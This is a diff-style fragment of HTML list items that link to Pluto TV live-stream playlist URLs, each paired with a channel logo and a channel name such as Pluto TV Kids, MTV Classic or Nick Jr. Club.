+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde2ac4bc6c500094ab45b/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde2ac4bc6c500094ab45b/colorLogoPNG.png	"/> <h6>	Pluto TV Junior	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde2f53449c50009b2b4dc/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde2f53449c50009b2b4dc/colorLogoPNG.png	"/> <h6>	Pluto TV Misterios	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dcde437229eff00091b6c30/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dcde437229eff00091b6c30/colorLogoPNG.png	"/> <h6>	Pluto TV Cine Estelar	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd6ab8056beb000091fc6b6/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd6ab8056beb000091fc6b6/colorLogoPNG.png	"/> <h6>	Pluto TV Hogar	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd6d935d000120009bc1132/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd6d935d000120009bc1132/colorLogoPNG.png	"/> <h6>	Pluto TV  Competencias	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd6dae8ce788b0009eaf77b/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd6dae8ce788b0009eaf77b/colorLogoPNG.png	"/> <h6>	Pluto TV Kids	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd6dc7480e3550009133d4a/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd6dc7480e3550009133d4a/colorLogoPNG.png	"/> <h6>	Pluto TV Velocidad​	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd6ddb30a1d8a000908ed4c/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd6ddb30a1d8a000908ed4c/colorLogoPNG.png	"/> <h6>	Pluto TV Cine Familia​	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd6de52b9914200091f047a/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd6de52b9914200091f047a/colorLogoPNG.png	"/> <h6>	Pluto TV Teen	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd834c66fe2ca0009303b8d/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd834c66fe2ca0009303b8d/colorLogoPNG.png	"/> <h6>	Pluto TV Animales	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd8364ea1d6780009929902/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd8364ea1d6780009929902/colorLogoPNG.png	"/> <h6>	Pluto TV Ciencia	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd837642c6e9300098ad484/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd837642c6e9300098ad484/colorLogoPNG.png	"/> <h6>	Pluto TV Series Latinas	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5dd85eac039bba0009e86d1d/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5dd85eac039bba0009e86d1d/colorLogoPNG.png	"/> <h6>	Pluto TV Naturaleza	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5ddc266f80e3550009136843/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5ddc266f80e3550009136843/colorLogoPNG.png	"/> <h6>	Pluto TV Aventura	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5ddc4e8bcbb9010009b4e84f/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5ddc4e8bcbb9010009b4e84f/colorLogoPNG.png	"/> <h6>	Pluto TV Cine Suspenso	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5ddd7c348520b40009c347e2/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5ddd7c348520b40009c347e2/colorLogoPNG.png	"/> <h6>	Nick Clásico	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5ddd7cb2cbb9010009b4fe32/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5ddd7cb2cbb9010009b4fe32/colorLogoPNG.png	"/> <h6>	Nick Jr. Club	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5de5758e1a30dc00094fcd6c/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5de5758e1a30dc00094fcd6c/colorLogoPNG.png	"/> <h6>	Pluto TV Historia	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5de58ef515635d00091f605d/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5de58ef515635d00091f605d/colorLogoPNG.png	"/> <h6>	Degrassi	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5de802659167b10009e7deba/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5de802659167b10009e7deba/colorLogoPNG.png	"/> <h6>	Pluto TV Series Retro	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5de91b7ea86ee60009d89e75/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5de91b7ea86ee60009d89e75/colorLogoPNG.png	"/> <h6>	MTV Classic	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5de91cf02fc07c0009910465/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5de91cf02fc07c0009910465/colorLogoPNG.png	"/> <h6>	Telefe Clásico	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5defde6d6c07b50009cf0757/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5defde6d6c07b50009cf0757/colorLogoPNG.png	"/> <h6>	Pluto TV Cine	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5df265697ec3510009df1ef0/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5df265697ec3510009df1ef0/colorLogoPNG.png	"/> <h6>	Pluto TV Vida Real	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5df41355939756000921d15b/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5df41355939756000921d15b/colorLogoPNG.png	"/> <h6>	Latin Angels	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e3ddbd27091820009f86dd9/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e3ddbd27091820009f86dd9/colorLogoPNG.png	"/> <h6>	MasterChef	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e3ddd1a3ef73b00091d5779/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e3ddd1a3ef73b00091d5779/colorLogoPNG.png	"/> <h6>	Fútbol Para Fans	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e46e64dc73db400094b5f0b/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e46e64dc73db400094b5f0b/colorLogoPNG.png	"/> <h6>	Minuto Para Ganar	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e67d41b93312100076f3fca/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e67d41b93312100076f3fca/colorLogoPNG.png	"/> <h6>	Los archivos del FBI	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e67e20c93312100076f3ffe/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e67e20c93312100076f3ffe/colorLogoPNG.png	"/> <h6>	Babar	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e6a4d875d7ccf0007cc2cf1/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e6a4d875d7ccf0007cc2cf1/colorLogoPNG.png	"/> <h6>	Pluto TV Animé Acción	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e793a7cfbdf780007f7eb75/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e793a7cfbdf780007f7eb75/colorLogoPNG.png	"/> <h6>	Guía de canales	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e8397936791b30007ebb5a7/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e8397936791b30007ebb5a7/colorLogoPNG.png	"/> <h6>	Pluto TV Humor	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e972a21ad709d00074195ba/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e972a21ad709d00074195ba/colorLogoPNG.png	"/> <h6>	Estrellas de Acción	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e98a911c881310007d7aae2/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e98a911c881310007d7aae2/colorLogoPNG.png	"/> <h6>	MTV Pranks	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5e98b0447665f200078caded/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5e98b0447665f200078caded/colorLogoPNG.png	"/> <h6>	Pluto TV Peleas	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5ea71d48af1d0b0007d837f4/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5ea71d48af1d0b0007d837f4/colorLogoPNG.png	"/> <h6>	The New Detectives	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5ea7215005d66d0007e8128a/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5ea7215005d66d0007e8128a/colorLogoPNG.png	"/> <h6>	Rugrats Crecidos	</h6></a></li>
